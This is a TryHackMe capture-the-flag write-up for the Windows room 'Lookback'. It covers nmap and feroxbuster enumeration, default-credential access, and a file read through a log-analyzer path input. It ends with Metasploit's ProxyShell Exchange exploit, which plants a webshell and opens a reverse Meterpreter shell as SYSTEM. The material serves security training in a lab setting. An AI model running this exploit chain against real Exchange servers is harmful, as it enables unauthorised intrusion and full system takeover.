---
title: "Lookback"
date: 2025-02-27
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Lookback
categories: [TryHackMe, Easy]
tags: [windows, privesc]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Lookback</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>You’ve been asked to run a vulnerability test on a production environment.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Windows</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/lookback">https://tryhackme.com/room/lookback</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Lookback.

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.242.206
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 15:43 EDT
Nmap scan report for 10.10.242.206
Host is up (0.041s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
443/tcp  open  https
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 130.50 seconds

```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 80,443,3389 10.10.242.206
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-27 15:46 EDT
Nmap scan report for 10.10.242.206
Host is up (0.039s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title.
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open  ssl/https
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7
| Subject Alternative Name: DNS:WIN-12OUO7A66M7, DNS:WIN-12OUO7A66M7.thm.local
| Not valid before: 2023-01-25T21:34:02
|_Not valid after:  2028-01-25T21:34:02
|_http-server-header: Microsoft-IIS/10.0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: THM
|   NetBIOS_Domain_Name: THM
|   NetBIOS_Computer_Name: WIN-12OUO7A66M7
|   DNS_Domain_Name: thm.local
|   DNS_Computer_Name: WIN-12OUO7A66M7.thm.local
|   DNS_Tree_Name: thm.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-03-15T19:46:27+00:00
| ssl-cert: Subject: commonName=WIN-12OUO7A66M7.thm.local
| Not valid before: 2025-03-14T19:36:49
|_Not valid after:  2025-09-13T19:36:49
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -17s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.87 seconds
```
From here I proceeded the analysis port by port.

## Port 80 & 443 Analysis

I began by accessing the webserver via port 80, but didn't get any further, so I started a `feroxbuster` directory enumeration:
```bash
$ feroxbuster -u http://10.10.242.206 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt 
                                                                                                                                                                                                                                             
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 邏                 ver: 2.11.0
───────────────────────────┬──────────────────────
   Target Url            │ http://10.10.242.206
   Threads               │ 50
   Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
   Status Codes          │ All Status Codes!
   Timeout (secs)        │ 7
 說  User-Agent            │ feroxbuster/2.11.0
   Config File           │ /etc/feroxbuster/ferox-config.toml
   Extract Links         │ true
   HTTP methods          │ [GET]
   Recursion Depth       │ 4
───────────────────────────┴──────────────────────
   Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET       29l       92w     1233c http://10.10.242.206/test
302      GET        3l        8w      209c http://10.10.242.206/ecp => https://10.10.242.206/owa/auth/logon.aspx?url=https%3a%2f%2f10.10.242.206%2fecp&reason=0
```

When I accessed the webserver using HTTPS, I was redirected to an Exchange server login page. However, without any credentials or email addresses to proceed, I moved on for the time being.

### Directory /test Analysis

The `/test` directory prompted for HTTP basic authentication. I tried some default username-password combinations manually and was successful. After logging in, the website displayed a log analyzer and the first flag. 

![Log Analyzer](/assets/img/tryhackme/Lookback/thm_lookback_1.jpg)

It seemed to load a specified log file, so I successfully tried accessing the Windows default file `win.ini`:

![Win ini](/assets/img/tryhackme/Lookback/thm_lookback_2.jpg)

From there, I was able to read files on the desktop of the user `dev`. I retrieved the next flag and an interesting note, where one sentence caught my attention:

![Note](/assets/img/tryhackme/Lookback/thm_lookback_3.jpg)

```text
Install the Security Update for MS Exchange [TO BE DONE]
```

## Shell as SYSTEM

Because of this to-do item, which likely hadn't been completed yet, I enumerated the Microsoft Exchange server version. While analyzing the source code, the path of the favicon caught my attention:
```html
<link rel="shortcut icon" href="/owa/auth/15.2.858/themes/resources/favicon.ico" type="image/x-icon">
```

The version number of the Exchange server was `15.2.858`. I researched the version number and found this <a href="https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxyshell_rce/">Rapid7 post</a> about the ProxyShell vulnerability. Since this post referenced Metasploit, I launched it on my machine, searched for the vulnerability, and loaded the module:
```bash
msf6 > search proxyshell
                                                                                                                                                                                                                                
Matching Modules                                                                                                                                                                                                                
================                                                                                                                                                                                                                

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE
   1    \_ target: Windows Powershell               .                .          .      .
   2    \_ target: Windows Dropper                  .                .          .      .
   3    \_ target: Windows Command                  .                .          .      .
msf6 > use exploit/windows/http/exchange_proxyshell_rce
[*] Using configured payload windows/x64/meterpreter/reverse_tcp
```

After setting all required options, I executed the exploit and successfully received the System flag:
```bash
msf6 exploit(windows/http/exchange_proxyshell_rce) >
msf6 exploit(windows/http/exchange_proxyshell_rce) > set RHOSTS 10.10.242.206
RHOSTS => 10.10.242.206
msf6 exploit(windows/http/exchange_proxyshell_rce) > set SRVHOST tun0
SRVHOST => [attackerip]
msf6 exploit(windows/http/exchange_proxyshell_rce) > set LHOST tun0
LHOST => [attackerip]
msf6 exploit(windows/http/exchange_proxyshell_rce) > set EMAIL dev-infrastracture-team@thm.local
EMAIL => dev-infrastracture-team@thm.local
msf6 exploit(windows/http/exchange_proxyshell_rce) > exploit

[*] Started reverse TCP handler on [attackerip]:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Attempt to exploit for CVE-2021-34473
[*] Retrieving backend FQDN over RPC request
[*] Internal server name: win-12ouo7a66m7.thm.local
[*] Assigning the 'Mailbox Import Export' role via dev-infrastracture-team@thm.local
[+] Successfully assigned the 'Mailbox Import Export' role
[+] Proceeding with SID: S-1-5-21-2402911436-1669601961-3356949615-1144 (dev-infrastracture-team@thm.local)
[*] Saving a draft email with subject 'WwEOWRXSr2K' containing the attachment with the embedded webshell
[*] Writing to: C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\YxuvU2L0goq2.aspx
[*] Waiting for the export request to complete...
[+] The mailbox export request has completed
[*] Triggering the payload
[*] Sending stage (201798 bytes) to 10.10.242.206
[+] Deleted C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\YxuvU2L0goq2.aspx
[*] Meterpreter session 1 opened ([attackerip]:4444 -> 10.10.242.206:9563) at 2025-03-15 16:13:39 -0400
[*] Removing the mailbox export request
[*] Removing the draft email

meterpreter > cd C:\Users\Administrator\Documents
meterpreter > ls
  Listing: C:\Users\Administrator\Documents
  =========================================

  Mode              Size  Type  Last modified              Name
  ----              ----  ----  -------------              ----
  100666/rw-rw-rw-  2232  fil   2023-01-26 16:16:32 -0500  Default.rdp
  040777/rwxrwxrwx  0     dir   2023-01-25 23:15:09 -0500  My Music
  040777/rwxrwxrwx  0     dir   2023-01-25 23:15:09 -0500  My Pictures
  040777/rwxrwxrwx  0     dir   2023-01-25 23:15:09 -0500  My Videos
  100666/rw-rw-rw-  402   fil   2023-01-25 23:15:14 -0500  desktop.ini
  100666/rw-rw-rw-  35    fil   2023-02-12 14:57:18 -0500  flag.txt

meterpreter > cat flag.txt
  THM{L[removed]d}

meterpreter > shell
  [...]
  c:\users\administrator\documents> whoami
  whoami
  nt authority\system
```

solved! :)